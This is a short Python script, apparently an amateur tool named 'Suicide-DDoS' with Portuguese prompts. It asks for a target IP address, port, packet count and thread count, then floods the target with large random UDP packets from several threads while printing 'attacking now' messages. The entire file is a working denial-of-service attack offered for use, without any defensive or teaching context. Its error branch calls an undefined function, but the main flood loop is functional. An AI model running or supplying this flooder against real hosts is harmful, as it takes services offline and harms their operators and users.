import random
import socket
import os
import time
import threading

print("  Suicide-DDoS  \n  by: t4ucci\n")

print("┏┓┃┃┏┫┣┓┃┃┃┃┗┓┏┘\n")

print("Iniciando programa..")

time.sleep(1)
print("\n1..")
time.sleep(1)
print("2..")
time.sleep(1)
print("3..\n")
time.sleep(1)

print("\n   Divirta-se!\n")

ip = str(input("[♤] Endereço: "))
port = int(input("[♤] Porta: "))
packs = int(input("[♤] Quant. Pacotes: "))
thread = int(input("[♤] Velocidade do Envio: "))

def start():
    bytes = random._urandom(25000)
    envios = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            for i in range(packs):
                s.sendto(bytes, (ip, port))
                envios += 1
                print('Atacando agora: '+ip+' || Enviando: '+str(envios))
        except:
             s.close()
             print("\nTirando do ar...\n")
             if not packs:
                 sendto(bytes, (ip, port))
                 print('Atacando agora: '+ip+' || Enviando: '+str(envios))
             else:
                 print("\nFim do ataque.\n")
                 break
for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
